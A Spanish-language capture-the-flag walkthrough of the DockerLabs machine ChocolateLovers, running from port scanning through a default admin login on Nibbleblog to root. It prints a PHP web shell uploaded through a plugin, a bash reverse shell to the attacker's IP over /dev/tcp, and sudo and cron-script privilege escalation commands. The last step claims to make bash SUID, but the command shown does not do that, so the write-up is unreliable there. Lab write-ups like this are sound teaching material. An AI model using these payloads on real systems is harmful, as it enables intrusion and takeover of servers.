# CHOCOLATE LOVERS - DOCKERLABS

## INFORMACIÓN Y DESPLIEGUE DE LA MÁQUINA

Esta máquina es de [DockerLabs](https://dockerlabs.es)

Para descargarla vas a [DockerLabs](https://dockerlabs.es) y buscas la máquina ChocolateLovers. Abres el enlace de mega, descargas el zip, lo descomprimes y ejecutas `bash ./auto_deploy.sh ./chocolatelovers.tar`. De esta forma se ejecutará el contendor de docker de la máquina.

### descripción

- Dificultad: fácil
- Sistema Operativo: Linux
- Autor: El Pingüino de Mario

## RECONOCIMIENTO DE RED

### conectividad y SO

Antes de empezar hay que confirmar que tenemos conectividad con la máquina, así que lanzamos `ping -c 1 172.17.0.2`.
> `-c 1`: solo enviar 1 paquete ICMP

![image](https://github.com/user-attachments/assets/266c2daa-b055-4f4f-92dd-e41463540782)

Vemos que tenemos conectividad y como tiene TTL 64 muy posiblemente la máquina use Linux.

### puertos y servicios

Hacemos un escaneo de todo el rango de puertos con nmap: `nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG tcp_ports`.
> `-p-`: todo el rango de puertos

> `--open`: solo reportar los puertos abiertos

> `-sS`: usar el método de escaneo SYN, que es más sigiloso y rápido que el normal. Requiere privilegios a nivel de sistema para enviar raw packets

> `--min-rate 5000` enviar como mínimo 5000 paquetes por segundo

> `-vvv` triple verbose. Nada más descubrir un puerto lo muestra por pantalla, también muestra más información de lo normal sobre el escaneo

> `-n` no hacer resolución DNS

> `-Pn` no hacer host discovery

> `-oG tcp_ports` exportar el output en formato grepeable al archivo `tcp_ports`

#### puertos abiertos

**80 - TCP - HTTP**

Hacemos un escaneo de servicios y versiones con nmap sobre el puerto 80: `nmap -p80 -sCV 172.17.0.2 -oN tcp_ports_targeted`.
> `-p80` hacer el escaneo sobre el puerto 80.

> `-sCV` escanear el servicio y la versión (`sV`) y lanzar los scripts de reconocimiento por defecto (`sC`)

> `-oN tcp_ports_targeted` exportar el output en formato nmap al archivo `tcp_ports_targeted`

## RECONOCIMIENTO WEB

Primero hacemos `whatweb http://172.17.0.2` desde consola:

![image](https://github.com/user-attachments/assets/9b943f53-93ab-49ac-994f-3eeef8aeccec)

No hay nada interesante a parte de la versión de Apache, que ya la sabíamos del escaneo de versiones de nmap.

Si vemos la web desde el navegador, sale esto:

![image](https://github.com/user-attachments/assets/bee97e49-7733-4c18-8150-4281e5718106)

Es la web predeterminada de Apache2 de Ubuntu. Si inspeccionamos el código, vemos varios comentarios en los que pone `<!-- /nibbleblog -->`, por lo que podemos probar esa ruta:

![image](https://github.com/user-attachments/assets/f17420e8-aeb7-4042-b3a0-4e95959c1f7c)

Al parecer se usa el CMS Nibbleblog. Vemos en el dashboard un enlace a `admin.php`, si nos metemos hay un panel de login. Si probamos de credenciales test:test, sale un error de php. Si ponemos admin:test, el error desaparece, lo que puede significar que el usuario admin existe. Podemos probar a meter admin:admin por si acaso funcionase, y vemos que nos deja loguearnos:

![image](https://github.com/user-attachments/assets/f08b666d-69f3-4064-a223-9cce9d410700)

## EXPLOTACIÓN WEB

Podríamos buscar en Google vulnerabilidades que tenga Nibbleblog. Si buscamos encontramos este exploit en python de github: https://github.com/TheRealHetfield/exploits/blob/master/nibbleBlog_fileUpload.py. Como es un exploit pequeño, podemos simplemente leer el código y entenderlo en vez de descargarlo y ejecutarlo. Parece ser que hay una ruta dentro del CMS que es `/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image`, en la que podemos subir archivos. Si cargamos la ruta sale esto:

![image](https://github.com/user-attachments/assets/a368b828-63f9-4893-8a4d-1db05f102aef)

Podemos probar a darle a Browse y subir una web-shell en php, que tenga este código:

```
<?php
	system($_GET['cmd']);
?>
```

Y vemos que en el exploit pone que la imagen que se sube se almacena en `/nibbleblog/content/private/plugins/my_image/image.php`. Si lo cargamos y probamos a poner `?cmd=id`, vemos que lo ejecuta:

![image](https://github.com/user-attachments/assets/76d6361c-9b8a-4ca9-928c-e5da92ac5e0d)

Así que ya tenemos un RCE. Nos ponemso en escucha por el puerto 443: `nc -nlvp 443`, y en la web-shell ejecutamos el comando `/bin/bash -c "bash -i >%26 /dev/tcp/172.17.0.1/443 0>%261"` para ganar la consola:

![image](https://github.com/user-attachments/assets/c0406c2a-be89-4265-acbd-2d0e023ec527)

Ahora hacemos el tratamiento de la TTY y empezamos al escalada de privilegios.

## ESCALADA DE PRIVILEGIOS (CHOCOLATE)

Si vemos el archivo `/etc/passwd`, vemos que hay un usuario llamado chocolate. Además si hacemos `sudo -l` para ver si tenemos privilegios especiales de sudo, vemos que podemos ejecutar sin contraseña `/usr/bin/php` como el usuario chocolate. Así que para ganar una bash como este usuario, ejecutamos `sudo -u chocolate /usr/bin/php -r 'system("/bin/bash");'`, y ganamos una bash como el usuario chocolate:

![image](https://github.com/user-attachments/assets/8501275a-ab0e-4b93-8f8f-4117482f1305)

## ESCALADA DE PRIVILEGIOS (ROOT)

Siendo el usuario chocolate, no podemos hacer `sudo -l` porque nos pide contraseña y no la sabemos. Tampoco encontramos archivos SUID interesantes. Pero podemos probar a buscar archivos que nos pertenezcan: `find / -user chocolate 2>/dev/null | grep -v "proc"`, hacemos `grep -v "proc"` para quitar los procesos que nos pertenecen. Y vemos esto:

![image](https://github.com/user-attachments/assets/96a52483-bc7a-4dce-9de2-1e0505a65cca)

Hay un archivo llamado `/opt/script.php`. Como somos propietarios de este archivo, podemos editarlo, pero por ahora no sirve de nada. Podríamos ver si hay otro usuario que lo ejecute, usando pspy. Podemos descargarlo en https://github.com/DominicBreuker/pspy. Lo ejecutamos:

![image](https://github.com/user-attachments/assets/5e809575-ade0-4919-bb81-0288cd173120)

Entre otros, vemos que el usuario de UID 0 (root) está ejecutando el archivo `/opt/script.php`, así que podemos editarlo para que cambie la bash a SUID:

`echo -n '<?php\n\tsystem("/bin/bash");\n?>' > /opt/script.php`

Esepramos a que root lo ejecute, y cuando veamos que la bash es SUID ejecutamos `bash -p` y ganamos una bash como root:

![image](https://github.com/user-attachments/assets/84f35b74-0cf2-4a1f-aefc-851d468df545)

Y ya somos root en la máquina ChocolateLovers.